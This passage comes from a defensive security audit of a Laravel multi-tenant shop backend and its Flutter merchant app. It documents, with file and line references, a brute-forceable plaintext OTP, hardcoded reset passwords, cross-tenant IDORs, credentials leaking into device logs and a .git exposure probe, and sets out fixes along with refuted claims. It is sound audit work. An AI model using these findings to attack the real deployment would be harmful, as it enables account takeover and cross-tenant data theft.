- SEC-04's cross-tenant dump needs to iterate `store_id`, and a miss returns **HTTP 200** because
  `repo-A app/Traits/ApiResponser.php:54` defaults `$code = 200` — invisible to status-code heuristics.
- SEC-05's order IDOR needs to iterate sequential order ids across the whole installation.
- SEC-03's companion customer-takeover needs to iterate `customer_id`.
- The API OTP flow has a **4-digit** OTP stored in **plaintext** in `customers.password_otp`
  (`repo-A app/Http/Controllers/Api/AuthController.php:265-266`), with a 10-minute window, no attempt
  counter and no lockout (`:318-336`) — 10,000 candidates, unthrottled, is brute-forceable. On success it
  sets the customer's password to the **hardcoded literal** `hello@1234` (`:334`) and mints a Sanctum
  token (`:369-371`), so every customer who completes that flow and does not immediately change it holds
  a second universal credential alongside SEC-17's `1234`.
- `forgot_password_send_otp` (`:246-295`) is also an unauthenticated **user-enumeration oracle**
  ("We can't find a user with that email address." at `:255` versus a success message), and its lookup at
  `:252` is **not store-scoped**, so it enumerates across all tenants.

**Login limiting, assessed honestly.** It exists but is IP-only:
`repo-A app/Providers/RouteServiceProvider.php:31-33` is `Limit::perMinute(3)->by($request->ip())`. Three
per minute is tight, but keying on IP alone means a distributed attacker is unlimited **per account**, and
one NAT'd corporate network can lock out all its users. The **web merchant** login has a second, better
limiter keyed on `email|ip` inside
`repo-A app/Http/Requests/Auth/LoginRequest.php:81-84` (5 attempts at `:62`). The API login endpoints have
only the IP-keyed one.

**Remediation.** Call `$middleware->throttleApi()` in `repo-A bootstrap/app.php`; add route-specific
`throttle:` to every OTP, password-reset and search endpoint (`repo-A routes/api.php:50-52`,
`repo-A routes/customer.php:96-119`); add an **attempt counter** to both OTP verification flows, neither of
which has one; and key the login limiter on `email|ip` for the API as the web path already does. Replace
the 4-digit plaintext OTP with the web flow's 6-digit hashed implementation (SEC-03).

---

### 1.10 Test-infrastructure and operational security

#### SEC-18 — PHPUnit is pointed at the live production database
**CRITICAL · P0 · Status VERIFIED · Implementation: N/A (configuration defect)**

**Where.** `repo-A phpunit.xml:25-26` — the SQLite in-memory override that **ships uncommented in the
Laravel 11 skeleton precisely to prevent this** has been commented out:

```xml
24:         <env name="CACHE_STORE" value="array"/>
25:         <!-- <env name="DB_CONNECTION" value="sqlite"/> -->
26:         <!-- <env name="DB_DATABASE" value=":memory:"/> -->
27:         <env name="MAIL_MAILER" value="array"/>
```

There is **no fallback isolation**: `.env.testing`, `phpunit.xml.dist` and `database/database.sqlite` all
do not exist (`ls` → No such file for each). So PHPUnit inherits `DB_CONNECTION=mysql` and the populated
`DB_HOST`/`DB_DATABASE`/`DB_USERNAME`/`DB_PASSWORD` from the **committed** `.env`
(`repo-A .env:8-13`).

**Eight of the ten test files `use RefreshDatabase`**, which on first use runs `migrate:fresh` — drop all
tables, re-migrate: `repo-A tests/Feature/ProfileTest.php:11`,
`tests/Feature/Auth/AuthenticationTest.php:11`, `EmailVerificationTest.php:14`,
`PasswordConfirmationTest.php:11`, `PasswordResetTest.php:13`, plus `PasswordUpdateTest.php` and
`RegistrationTest.php`.

**Impact.** Any developer who clones this repository and types `vendor/bin/phpunit` is **one command away
from `DROP TABLE` against whatever database those credentials reach**. Because `.env` is tracked in git,
that is not a hypothetical local misconfiguration — it travels with the repo.

*Fact: the file contents and the absence of `.env.testing`/`database.sqlite` were directly read. That
`RefreshDatabase` issues `migrate:fresh` is documented framework behaviour, not executed here —
`vendor/` is absent.*

**Remediation (one hour, do it first).** Uncomment `repo-A phpunit.xml:25-26`; add
`DB_FOREIGN_KEYS=true`; add a committed `.env.testing` with `APP_ENV=testing`, `DB_CONNECTION=sqlite`,
`DB_DATABASE=:memory:`. `pdo_sqlite` is confirmed present in `php -m`. **Risk:** some module code may
assume MySQL-specific SQL (JSON functions, `FULLTEXT`), so a few tests could error under SQLite — that is
a *visible* failure and strictly better than silent destruction. If MySQL-specific behaviour is genuinely
needed, point at a dedicated `*_test` database, **never** the production one.

---

### 1.11 Repo B — the Flutter merchant console

Repo B is, definitively, a **merchant/store-owner admin console** for the Repo A backend: five bottom-nav
tabs (Home/Orders/Products/Categories/More,
`repo-B lib/core/controller/dashboard_manager_controller/dashboard_manager_controller.dart:14-36`), it
*assigns* orders to delivery boys rather than receiving them
(`repo-B lib/config/repository/order_repository.dart:10-21`), and there is no cart, checkout or wishlist
screen anywhere in its 47 screen files. Its blockers are release-readiness and security, not architecture.

#### SEC-20 — The merchant's e-mail, plaintext password and bearer token are written to the device log
**CRITICAL · P0 · Status VERIFIED · Implementation: IMPLEMENTED AND VERIFIED (the leak is real)**

**Where.** `repo-B lib/core/controller/auth/auth_controller.dart:149-164`:
```dart
149: var url = Uri.parse(API.baseUrl + API.loginUrl);
150: Map<String, dynamic> data = {"email": email, "password": password};
152: log("===url============$url\n data===> ${json.encode(data)}");
160: print('Response status: ${response.statusCode}');
162: if (response.statusCode == 200) {
163:   var decoded = jsonDecode(response.body);
164:   print('Response body: $decoded');
```
Line `:152` serialises `data` — which holds `password` — into `dart:developer`'s `log()`. Line `:164`
prints the entire decoded login response, which per `:171-172` contains `userData['token']` (the bearer
token) and `userData['current_store']`.

**And every API response body is logged in full.** `repo-B lib/network/network.dart:146-158` writes the
whole body into a buffer and calls `logger.d(buffer.toString())`; it is called on the success **and**
failure path of all five verbs (`:366` GET, `:487` POST, `:609` PUT, `:790` MULTIPART, `:909` DELETE). The
`Logger` is constructed at `:29-38` with **no `level:` and no `filter:` argument**, so `package:logger`'s
default filter prints at trace level regardless of build mode. Request bodies are logged too (`:109-112`,
called with `body:` at `:478`, `:600`, `:737`). The repository layer adds nine more
`print("response=…$response")` statements in a single file
(`repo-B lib/config/repository/order_repository.dart:42,49,61,68,76,95,98,116,119,129,132,141`), each
dumping customer names, addresses, phone numbers and order totals.

**There is not a single build-mode guard.** Re-verified: `grep -rn "kReleaseMode\|kDebugMode\|kProfileMode"
lib/` → **0 hits**. (A grep for `print(` across `lib/` returns 180 matches, of which the dossier
attributed 161 to bare `print()` calls across 33 files; either way the order of magnitude is the point.)

**Impact.** In a Flutter release build, `print` and `dart:developer.log` are compiled in and reach the
platform log. On Android, any process holding `READ_LOGS`, any `adb logcat` session and any OEM or
crash-log collector sees the merchant's password in cleartext, plus the bearer token for a console that can
create orders and move wallet balance. This is **the only finding in Repo B that is a plausible real-world
account-compromise path.**

**One mitigation worth crediting.** `_logRequest` accepts a `headers` parameter
(`repo-B lib/network/network.dart:94`) but **never writes it to the buffer**, so the
`Authorization: Bearer` header built at `:54-64` is not logged by the request logger. The token still
leaks, via the login response body and via
`repo-B lib/core/services/firebase_messaging_service.dart:246`, where the full FCM token is printed
unredacted — note that `repo-B lib/core/services/fcm_token_service.dart:75,102,164` deliberately truncates
to 20 characters, **so the team knows better elsewhere**.

*Fact: the lines and the absence of guards were read directly. Inference: that release builds emit them —
documented Dart/Flutter and `package:logger` behaviour, which could not be executed here because no SDK is
installed (BLOCKED).*

**Remediation (highest value-per-hour item in Repo B; can land today).** Add
`filter: ProductionFilter()` or `level: kReleaseMode ? Level.off : Level.debug` to the single `Logger`
construction at `repo-B lib/network/network.dart:29-38` and the whole network layer goes quiet in release
at once. **Delete** — do not guard — `repo-B lib/core/controller/auth/auth_controller.dart:152,164`: a
password should never reach a logger in any build. Redact
`repo-B lib/core/services/firebase_messaging_service.dart:246,257` to the 20-character truncation already
used correctly in the sibling service. Replace the bare `print(` calls with `debugPrint` or a guarded
logger, then enable the `avoid_print` lint so it stays fixed.
**Sequencing:** do this **before** turning Crashlytics on (Section 4.4), so you are not shipping logged
passwords to Crashlytics breadcrumbs.

#### SEC-21 — The Android release build is signed with the debug keystore
**CRITICAL · P0 · Status VERIFIED · Implementation: MISSING (no release signing config)**

`repo-B android/app/build.gradle.kts:37-43`:
```kotlin
37: buildTypes {
38:     release {
39:         // TODO: Add your own signing config for the release build.
40:         // Signing with the debug keys for now, so `flutter run --release` works.
41:         signingConfig = signingConfigs.getByName("debug")
42:     }
43: }
```
This is the unmodified `flutter create` placeholder. There is no `signingConfigs { create("release") }`,
no `android/key.properties` (`ls` → No such file), and no `.jks`/`.keystore` anywhere. Also absent from
the whole block: `isMinifyEnabled`, `isShrinkResources` and any ProGuard/R8 rules — so release builds are
unobfuscated and unshrunk.

**Impact.** Google Play rejects debug-signed uploads, so **there is no release path today**, and the app's
signing identity is not under the owner's control.

**Positive, for the record.** No keystore and no password is committed; `repo-B android/.gitignore:10-14`
and the root `.gitignore:50-54` both correctly exclude `key.properties`, `*.keystore`, `*.jks`, `*.p12`,
and no such file appears anywhere in the 68-commit history. **The exposure here is a missing config, not a
leaked one.**

**Remediation.** The standard `key.properties` + `signingConfigs.create("release")` recipe drops in
without new risk of committing a secret, because the ignore hygiene is already correct. Add
`isMinifyEnabled = true` and `isShrinkResources = true` in the same edit, and test a release build —
R8 can break reflection-based code (Firebase ships its own consumer rules, but verify).
**This is an owner decision, not a dev-team one, and it has a long tail:** the keystore becomes a single
point of failure — lose it and the app can never be updated under that package name, so it must be
escrowed outside the repository in two places **before** first upload. Ask now whether the current agency
already holds a keystore used for any prior upload, because that would need transferring.

#### SEC-34 — The bearer token is stored unencrypted on-device
**MEDIUM-HIGH · P1 · Status VERIFIED · Implementation: IMPLEMENTED AND VERIFIED (as designed; the design is the problem)**

`repo-B lib/utils/prefer.dart:48-54` reads and writes the token through `get_storage`, which persists to a
**plaintext JSON file** in the app's documents directory. There is no `flutter_secure_storage`, Keychain or
Keystore usage anywhere in `pubspec.yaml`. Stored alongside by the same mechanism: `userId`, `storeId`,
`fcm_token`, `device_id`, e-mail and name
(`repo-B lib/core/controller/auth/auth_controller.dart:178-182`).

**Calibrated honestly.** On a non-rooted, non-jailbroken device this file is inside the app sandbox and is
not readable by other apps, so this is **not remotely exploitable on its own**. It matters because (a) it
is trivially readable on a rooted/jailbroken device, via a device backup, or with physical access plus a
debug bridge; (b) the token appears to be a long-lived Laravel API token — there is no refresh flow and no
expiry handling in `lib/`, the only expiry path being a reactive 401 →`_handleUnauthorized` at
`repo-B lib/network/network.dart:333-341`; and (c) it compounds SEC-20, where the same token is also
written to the log. *Token longevity is an inference, not read from the backend here.*

**Remediation, and the design is already right for it.** All token access funnels through
`Prefs.getToken()`/`setToken()` and is consumed in exactly one meaningful place, `_getAuthHeaders()`
(`repo-B lib/network/network.dart:54-64`). Swap those two method bodies to `flutter_secure_storage`. One
wrinkle: secure storage is async while `Prefs.getToken()` is sync — either make `_getAuthHeaders` async
(its 5 call sites are already `async`) or cache the token in memory after an async read at startup.
Migrate existing users (read once from GetStorage, write to secure storage, erase the old key) or every
session is invalidated on upgrade. **Prerequisite: SEC-20 first** — moving the token to the Keychain while
still printing it to logcat solves nothing.

#### SEC-36 — The merchant avatar falls back to the upstream vendor's demo server
**HIGH · P1 · Status VERIFIED · Implementation: IMPLEMENTED AND VERIFIED (the leak is live)**

`repo-B lib/utils/images.dart:82-86` holds five absolute third-party URLs pointing at
`apps.rajodiya.com/ecommercego-*` — the upstream **eCommerceGo SaaS vendor's own demo deployment**, i.e.
the stock Workdo product Repo A is a customised copy of. `profileImg` (`:82`) is **live in two production
screens** as the `errorWidget` of the merchant's avatar:
`repo-B lib/view/screen/profile_screen/profile_screen.dart:305-308` and
`repo-B lib/view/screen/home_screen/home_screen_widget.dart:203-206`.

**Impact.** Whenever a merchant has no avatar, or the CDN hiccups, **every app on every device issues a
request to a third party's server on the home screen**. That is an availability dependency on a vendor
nobody has a contract with, a traffic and IP leak of the user base to that vendor, and a branding leak.
(`productImg` at `:83` is dead — 0 references; `codImg`/`bankTransferImg`/`stripeImg` are referenced only
from the commented-out payment controllers.)

**Remediation (trivial).** Both call sites already have a final `Icon(Icons.person)` fallback
(`profile_screen.dart:311-316`, `home_screen_widget.dart:209-215`), so the simplest correct fix is to
**delete the `Image.network` middle layer entirely** and let it fall through to the icon. Delete all five
dead URLs at `repo-B lib/utils/images.dart:82-86`.

#### Related Repo B security posture — the clean results, stated explicitly

| Control | State | Evidence |
|---|---|---|
| TLS not weakened | **PASS** | `grep "badCertificateCallback\|HttpOverrides\|SecurityContext\|allowBadCertificates" lib/` → **0 hits** (re-verified). No `usesCleartextTraffic` and no `networkSecurityConfig` in `repo-B android/app/src/main/AndroidManifest.xml` on `targetSdk = 36`, so cleartext is denied by default; no `NSAppTransportSecurity` dict in `repo-B ios/Runner/Info.plist`, so ATS is fully enforced |
| HTTPS everywhere | **PASS** | `repo-B lib/utils/base_api.dart:3`; the only `http://` match in `lib/` is a `startsWith` guard at `repo-B lib/utils/helper.dart:68` |
| Certificate pinning | **ABSENT (MEDIUM, P2)** | no pinning APIs anywhere. Absent pinning is the industry default and the real attack requires a controlled trust store — worth considering for a financial-adjacent console, but not HIGH |
| Keystore/password committed | **PASS** | none, ever, in 68 commits |
| Hardcoded API secrets in `lib/` | **PASS** | secret-prefix grep returns nothing |
| Firebase config committed | **ACCEPTABLE** | `repo-B android/app/google-services.json`, `ios/Runner/GoogleService-Info.plist` hold **client-side identifiers** that Google designs to ship inside the binary; the real control is Firebase Console API-key restriction plus security rules, outside this repo. **Key paths were enumerated; no values were read or printed.** One genuine mismatch: the iOS `BUNDLE_ID` at `repo-B ios/Runner/GoogleService-Info.plist:18` is still the **stock Workdo registration**, not a Store Syria one, while Android's `applicationId` is `com.syriastore.app` (`repo-B android/app/build.gradle.kts:27`) |
| `.env` committed | **MINOR** | `repo-B assets/.env` is tracked but holds only `IS_DEMO_MODE=false` — no secret. Note the root `.gitignore:55-56` has `#**/*.env` and `#.env` **commented out**, i.e. the ignore rules were deliberately disabled |
| Android permissions | **PASS (minor caveats)** | 9 permissions at `repo-B android/app/src/main/AndroidManifest.xml:3-11`, all proportionate — no location, contacts, camera, SMS or phone state. Two caveats: `WRITE_/READ_EXTERNAL_STORAGE` are no-ops on `targetSdk 36` and should be dropped or `maxSdkVersion`-scoped; `USE_FULL_SCREEN_INTENT` is policy-reviewed by Google Play and is hard to justify for merchant order alerts — expect a Play Console challenge |
| 401 handling | **PASS** | `repo-B lib/network/network.dart:333-341` clears storage and force-navigates to login, guarded against re-entry |

**One non-security but commercially urgent item, flagged because it has a long lead time.**
`repo-B pubspec.yaml:43` declares `syncfusion_flutter_charts: ^34.1.32` — **commercial software** — and it
is imported by two live screens
(`repo-B lib/view/screen/statistics_screen/statistics_screen_widget.dart` and
`lib/view/screen/home_screen/home_screen_widget.dart`). `grep -rn "SyncfusionLicense\|registerLicense"
lib/` returns **0 hits** (re-verified): no key is registered anywhere, including `main.dart`. Without a
registered key the widgets render a licence banner in release builds, and shipping without either a paid
licence or a qualifying Community Licence is a licence violation. **Status: VERIFIED that no key is
registered; UNKNOWN whether the owner holds a licence — that is a commercial fact outside both
repositories.** Ask early: if the answer is no, the owner chooses between buying a licence (one
`registerLicense` call in `main.dart`, key injected via `--dart-define`, never committed) and replacing the
charts, and replacement means refactoring the second-largest file in the repo (1,375 lines).

---

## 2. SUSPECTED / PLAUSIBLE ISSUES

Everything in this section is **not** confirmed. It is separated from Section 1 deliberately: these items
should be *checked*, not *fixed on faith*, and none of them should carry weight in a go/no-go decision
until checked. Each row says what would settle it.

### 2.1 Claims that were asserted by an auditor but NOT independently verified

These came from the dossiers and were **not** covered by the adversarial skeptic pass. Several were
spot-confirmed while writing this document and have been promoted into Section 1 (SEC-03, SEC-13, SEC-14,
SEC-17, SEC-24, SEC-25, SEC-30, SEC-37); the remainder stay here.

**Six rows that previously sat in this table have been settled and have left it.** Each was settled by a
single command, and that command is published with the finding it became. Leaving them parked here was a
defect of this audit's process, not a property of the codebase: the cheapest verification available was
the one not done.

| Previously parked claim | Now |
|---|---|
| `POST /api/admin/changestore` lets any caller set their own `current_store` to an arbitrary store id | **CONFIRMED · VERIFIED · CRITICAL · P0.** The authoritative write-up is `04-DATABASE-AND-MULTITENANCY.md` §4.4, "The master key: `current_store` is writable from the API — VERIFIED, CRITICAL, P0", which that document calls the most important single finding it contains; doc 00 ranks it a top finding too. Re-confirmed for this document: `repo-A app/Http/Controllers/Api/DashboardController.php:3550-3554` does `Store::find($request->store_id)` and then `$user->current_store = $store->id; $user->update();` with **no ownership predicate**, so the caller sets the tenant discriminator; the route is registered at `repo-A routes/api.php:305` (`POST changestore`, middleware `custom.auth` + `AdminApiLog` — and `custom.auth` is SEC-01); and the correctly scoped contrast exists in the same class at `:3607-3609`, `Store::where('id', $request->store_id)->where('created_by', $user->id)->first()`, so the right predicate is present a few dozen lines away and simply absent here. **This row has been removed from the table below so that no owner can read two different statuses for the same issue. The status is VERIFIED, not unverified.** |
| `UserController::update` mass-assigns `type`, so `Edit User` is a route to super admin | **CONFIRMED · VERIFIED · CRITICAL · P0 — promoted to SEC-37** (Section 1.3). SEC-37 also reports a **second limb that was not reported anywhere before**: the same method loads the target user with no ownership scoping, so the same permission is additionally a cross-tenant user-edit IDOR |
| `public/js/custom.js` registers the `data-ajax-popup` click handler twice | **CONFIRMED — Section 4.7(a)**, with the asserted severity corrected downward |
| `DemoModeMiddleware` calls `$this->handleDemoMode()`, defined nowhere | **CONFIRMED — Section 4.7(b)** |
| `resources/lang/ar/` is missing the core framework catalogues while `resources/lang/he/` has them | **CONFIRMED, and the shape of it is worse than was asserted — Section 4.7(c)** |
| No Arabic-capable font is declared or loaded anywhere | **CONFIRMED ABSENT — Section 4.7(d)** |


| Claim | Asserted severity | Area | What would settle it |
|---|---|---|---|
| `AppSettingController::store()` permits any authenticated user of any role to write a file with an attacker-controlled extension into the web-served application root (an RCE path) | CRITICAL | 11 | This is SEC-15, which **is** in Section 1 for the code path. The *RCE* limb specifically — that a written `.php` executes — remains SUSPECTED: one upload test on staging settles it |
| 70 admin-API methods call `Store::find($request->store_id)` with no ownership check; a subset then operate on child records with no `store_id` constraint (order delete, order/category/coupon/tax/shipping/variant delete) | CRITICAL | 10 | The 70-count is a `grep -c`, and roughly 25 of the bodies were read. The pattern is VERIFIED (SEC-04, SEC-10); the **exact affected count is UNKNOWN and is a floor, not a ceiling** |
| `password_reset_tokens` is shared between the `users` and `customers` brokers with no guard discriminator, so a customer-issued reset token may be accepted by the admin reset endpoint | HIGH | 10 | The **configuration defect is CONFIRMED** (`repo-A config/auth.php:108-121` — both brokers point at the same table; `repo-A database/migrations/2014_10_12_100000_create_password_reset_tokens_table.php:14-18` — `email` is the **primary key**, so one row per e-mail across both identity types). **Exploitation is SUSPECTED, not executed**, because `Password::broker('customers')->reset(...)` re-resolves through the `customers` provider and the cross-broker outcome depends on runtime ordering. Fix the configuration regardless: two identity domains must not share one e-mail-keyed token table |
| `CustomAuth` cannot distinguish identity classes safely: merchant, customer and courier share one token table and one middleware with no route-level declaration of the expected class | HIGH | 10 | The structural gap is **confirmed by reading** `repo-A app/Http/Middleware/CustomAuth.php:36-45` and `repo-A routes/api.php` (courier endpoints at `:318-331`, customer endpoints at `:56-131`, merchant endpoints throughout `:133-369`, all in one file and one group). Whether a *specific* endpoint rejects a wrong-class token depends on whether its body reads `auth()->user()` versus `auth('customers')->user()`, and all 211 routes were **not** traced. SUSPECTED per-endpoint; structurally real |
| **Corrected claim — the previous wording was wrong, not merely unverified.** That wording was: "`$pixelScript` is read in three layouts and assigned nowhere in the repository, so the `isset()` guard is always false", asserted HIGH. **Both limbs fail.** It is read in **four** layouts (`repo-A resources/views/front_end/layouts/app.blade.php:61`, `repo-A themes/techzonix/views/front_end/layouts/app.blade.php:157`, `repo-A themes/greentic/views/front_end/layouts/app.blade.php:77`, `repo-A themes/stylique/views/front_end/layouts/app.blade.php:81`), and it **is** assigned: `repo-A packages/workdo/LandingPage/src/Entities/Pixel.php:28,37,42` builds and returns it, and `repo-A packages/workdo/Marketing/src/app/Http/Controllers/StoreController.php:209,213` builds it with `:299` passing it to a view via `compact()`. **The real open question is narrower:** every assignment that reaches a view belongs to the **Marketing vcard** controller, which renders `marketing::store.index` and `marketing::card.*` — not the four `front_end` storefront layouts above; and `Pixel::getPixelScript()` has **no caller at all** (`grep -rn "getPixelScript" app packages resources themes --include=*.php` returns only its own definition, `Pixel.php:26`). So what is unresolved is whether the **eCommerce storefront** controllers ever supply `$pixelScript` to the storefront layouts — i.e. whether a merchant's tracking pixels render on a storefront page at all | MEDIUM | 7 | Trace the storefront request path. The view composer bound to `front_end.layouts.app` is `repo-A app/Providers/ViewServiceProvider.php:23`, and it does **not** add `pixelScript` to the data it shares, so if no storefront controller passes it the `@if(isset($pixelScript))` guard at `:60` / `:156` / `:76` / `:80` of those four layouts is false and merchant analytics and ad-retargeting are silently dead **on the storefront** while working on vcard pages. One storefront page load with the browser network tab settles it. **Re-rated MEDIUM, not HIGH:** a possibly-dead revenue feature, and nothing here shows a defect that misbehaves |
| **Tempered claim.** `repo-A routes/console.php:9` calls `Schedule::command('zid:process-events')->everyMinute()->withoutOverlapping();` while `:3-4` import only `Illuminate\Foundation\Inspiring` and `Illuminate\Support\Facades\Artisan` — there is no `use Illuminate\Support\Facades\Schedule`. **That premise is re-verified and correct.** The earlier wording went further and asserted at HIGH that line 9 therefore throws `Class "Schedule" not found` on every console boot, "making the entire artisan CLI unusable from a clean checkout". **The counter-consideration:** Laravel registers a set of global facade aliases itself, via `Illuminate\Foundation\AliasLoader` seeded from `Facade::defaultAliases()`, which does **not** depend on the project declaring a `config/app.php` `aliases` key — so the unqualified `Schedule::` most likely resolves and the predicted fatal error probably never occurs. Deciding between the two requires reading the installed framework source | **LOW** on what is proven (a missing `use` statement); the "CLI unusable" framing is withdrawn as unproven | 13 | **UNVERIFIABLE in this environment — BLOCKED, not failed.** `vendor/` is **ABSENT**, so no `php artisan` command was run and the PHPUnit suite was **NOT EXECUTED**. See Section 4.3. One command after `composer install` settles it: `php artisan schedule:list` — if it prints the job, only the cosmetic missing import remains (LOW / P3); if it throws, the CLI is unusable from a clean checkout and it is P0. **Add the `use` statement regardless:** a one-line change that removes the question |
| No e-mail can be sent and no queued job can run: effective `MAIL_MAILER` is `log` and effective `QUEUE_CONNECTION` is `database` with no worker defined anywhere | HIGH | 1, 13 | See Section 4.3. The config resolution was verified by reading each `env()` call site and counting each key's presence in `.env`; the **user-visible** consequence (password resets and OTPs never arrive) is inference. One `php artisan tinker` mail send on staging settles it |
| `app/Exceptions/Handler.php` never executes under this Laravel 11 bootstrap, so the application runs entirely default exception handling | HIGH | 2 | `repo-A bootstrap/app.php:66-68` has an empty `withExceptions` closure and the legacy handler is referenced nowhere — **high-confidence**, and it matters because it means no custom API error shaping exists, so with `APP_DEBUG=true` an API exception returns a full stack trace |
| The 69 `packages/workdo` modules are not installed by Composer at all — zero `workdo` entries in `composer.lock` — but PSR-4-injected at runtime from the `add_on_managers` table, which makes `route:cache`/`optimize` unable to produce a correct artifact | HIGH | 1 | `jq` over `composer.lock` plus reading `repo-A app/Providers/PackageServiceProvider.php`. Partly corroborated here: `PackageServiceProvider.php:32,61,79` is exactly the DB-driven runtime registration that SEC-08 path 2 exploits |

### 2.2 Structural suspicions that affect how much of this audit can be trusted

These are not findings; they are bounds on the findings.

**(a) Route files are registered twice — the effective middleware stack per URI is UNKNOWN.**
`repo-A bootstrap/app.php:8-14` registers `routes/web.php` and `routes/api.php` via `withRouting()`, and
`repo-A app/Providers/RouteServiceProvider.php:35-42` registers **the same two files again**, with
`RouteServiceProvider` active at `repo-A bootstrap/providers.php:7`. This is a Laravel 10→11 migration
artefact. **Consequence: the middleware list printed next to a route in the source may not be the one that
runs.** Resolving it requires `php artisan route:list`, which boots the app and touches the database —
BLOCKED here. **Every "this route has no auth middleware" claim in Section 1 is based on reading the route
file.** This should be the **first** thing confirmed in a staging environment, because it bears on SEC-04,
SEC-06, SEC-14, SEC-26 and SEC-32. *(Note it cuts both ways: duplicate registration could also mean a
throttle or group is applied twice, not that auth is secretly present.)*

**(b) ~58 of 69 addon modules were not examined.** The `packages/workdo/` tree carries 418 route
definitions across 136 files. A grep confirms **none** carries a permission middleware, and all nine social
controllers plus both 2FA modules were read in full. The remaining ~58 modules' controllers were **not**
read. Given that the modules which *were* read contained SEC-17 (hardcoded `1234` in all nine) and SEC-30
(shared TOTP secret), **the unexamined addons should be presumed to contain comparable defects.** This is
the single largest unexamined surface in this audit.

**(c) The two largest controllers were sampled, not exhausted.**
`repo-A app/Http/Controllers/Api/ApiController.php` is 7,404 lines and
`repo-A app/Http/Controllers/Api/DashboardController.php` is 7,631. Roughly 45 methods were read in full
and the rest were grepped. The 304 `::find($request->…)` / `::find($id)` call sites are a **candidate**
set; about 25 were confirmed by reading the bodies. **The true IDOR count is higher than what is cited
here, not lower.**

**(d) The exploitable Blade sink list is a floor.** 2,392 `{!! !!}` sites across 486 files were triaged by
data-source pattern; not all 486 files were opened.

**(e) Approximately 24 payment-gateway callbacks were not individually audited for signature
verification.** One (`handlePaymeraCallback`) was spot-checked and found sound. Each remaining gateway
needs its own review before that gateway is enabled.

**(f) Runtime and database state is UNKNOWN throughout.** Whether `email_verification` is on, whether 2FA
is enabled for anyone, what the effective upload allowlist (`local_storage_validation`) actually is, and
whether the production schema contains the tables that have no migration (Section 4.2) — none of these can
be read from the repository. Note one consequence that cuts in the *safe* direction: if `storage_setting`
is empty, `upload_file` returns early at `repo-A app/Models/Utility.php:419-427` and uploads fail closed.

---

## 3. REFUTED CLAIMS — do not pay to fix these

This section exists because the first audit pass produced several alarming claims that did **not** survive
adversarial checking. Each is listed with what was actually investigated, why it is not a problem (or not
the problem that was claimed), and — where there *is* a real defect nearby — what the correct target is.
**Spending budget on the refuted framings would buy nothing and, in two cases, would fix the wrong file.**

| # | Claim as originally asserted | Verdict | What is actually true |
|---|---|---|---|
| R-1 | "Full application source is disclosed by the web server" | **REFUTED** | `.php` files under the app root are **executed by the PHP handler, not emitted as text** — this covers `app/**`, `routes/**`, `config/**`, `database/migrations/**`, `packages/workdo/**/*.php` and Blade views. `repo-A error_log:1-5` is itself positive proof that PHP executes under this root, and `config/*.php` files `return [...]` and emit nothing. The real exposure is the **non-PHP** files listed in SEC-32, plus partial Blade-markup leakage |
| R-2 | "Full git history, including the committed `.env`, is disclosed over HTTP" | **UNVERIFIED — must not be asserted** | This depends on whether a `.git/` directory exists at `/home/<redacted-account>/public_html`, which is only inferable from the repo, **and** on whether the vhost blocks dotfile paths, which the repo cannot see. The live probe was BLOCKED. The **live** `.env` is covered by the `.htaccess:6-9` deny, so the `.env`-credential risk runs *only* through this unproven limb. The committed `.env` remains a CRITICAL finding on its own merits (SEC-16 — secrets in GitHub history), but it is **not established as web-reachable**. One manual `curl -I https://<host>/.git/config` settles it |
| R-3 | "`.env.example` is a headline exposure" | **REFUTED** | It holds variable names plus stock Laravel 11 placeholders with the sensitive slots **empty**: `repo-A .env.example:3` `APP_KEY=`, `:58` `AWS_ACCESS_KEY_ID=`, `:59` `AWS_SECRET_ACCESS_KEY=`. No secrets |
| R-4 | "The 52 KB file `_active', 1)` at the repo root is a customer-data leak" | **REFUTED** | `file` reports "ASCII text, with overstriking" and its head is `SUMMARY OF LESS COMMANDS` — it is captured `less(1)` help output written by a shell typo and then committed. **Harmless in content.** It is conclusive evidence of absent code review and `.gitignore` hygiene, and it should be deleted, but it is not a data leak |
| R-5 | "`uploads/receipt/` is a financial-PII leak" | **REFUTED** | It contains exactly **one** file, `icon.png_1783941141` — not a bank slip. (`uploads/profile/` likewise holds one file.) The 407 committed `uploads/` files are **merchant store assets** — logos, product images, Arabic-named screenshots — rather than confirmed customer PII. Repo bloat and cross-tenant asset exposure to anyone with repo access: real, but **MEDIUM**, not critical |
| R-6 | "`error_log` leaks credentials" | **REFUTED (overstated)** | 975 bytes, 5 lines, all `PHP Fatal error`. Grep counts for sensitive categories: `SQLSTATE` 0, `password` 0, `mysql` 0, `token` 0, `Authorization` 0, `@` 0; `/home/` **3**. So **no credentials** — but it does disclose absolute server filesystem paths and the hosting account layout. Information disclosure, **LOW-MEDIUM**, aggravated only because SEC-32 may make it web-readable |
| R-7 | "Path traversal in the upload handler via `getClientOriginalName()`" | **REFUTED** | Symfony's `UploadedFile::getClientOriginalName()` returns a **basename** — its constructor strips directory components — so `../../evil` cannot escape `$dir`. This is flagged explicitly because it is the intuitive claim and it is wrong. **The real defect is that the extension is attacker-controlled** (SEC-15) |
| R-8 | "Path traversal / raw archive paths in the module and theme zip installers" | **REFUTED** | Symfony basenames the client filename and PHP 8.3's `ZipArchive::extractTo` normalises `../` entries. **Traversal is unnecessary**, because the extraction destinations (`themes/`, `packages/workdo/`) are already inside the document root (SEC-08) |
| R-9 | "`PackageServiceProvider` autoloads everything under `packages/workdo/*`" | **REFUTED as written** | It loads only the module names present in the `add_on_managers` **database table** (`repo-A app/Providers/PackageServiceProvider.php:32`). That is precisely why the attacker-controlled `add_on_managers` insert is the exploitation mechanism in SEC-08 path 2 — getting the framing right changes the fix (add an `is_enable` filter) |
| R-10 | "The XSS middleware's `htmlspecialchars_decode` turns a blocked payload into a live one" | **REFUTED (mechanism), severity CRITICAL → MEDIUM** | The denylist never removes literal `<` or `>`, only their entity forms, so a raw payload passes **untouched with or without the decode**. The middleware is a **no-op for XSS**, not an amplifier. The genuine defect is different and was missed originally: it **silently corrupts passwords** (SEC-35). And the real XSS root cause is the 2,392 unescaped sinks plus the missing validation layer (SEC-28), which must be reported on its own rather than folded into the middleware finding |
| R-11 | "Blade escaping mitigates the stored-XSS risk" | **REFUTED** | 2,392 `{!! !!}` occurrences exist, including raw model data at `repo-A resources/views/category/create.blade.php:22`, `category/edit.blade.php:23`, `testimonial/create.blade.php:17` and `plans/stripe.blade.php:1252`. Blade escaping is **not** a blanket mitigation here |
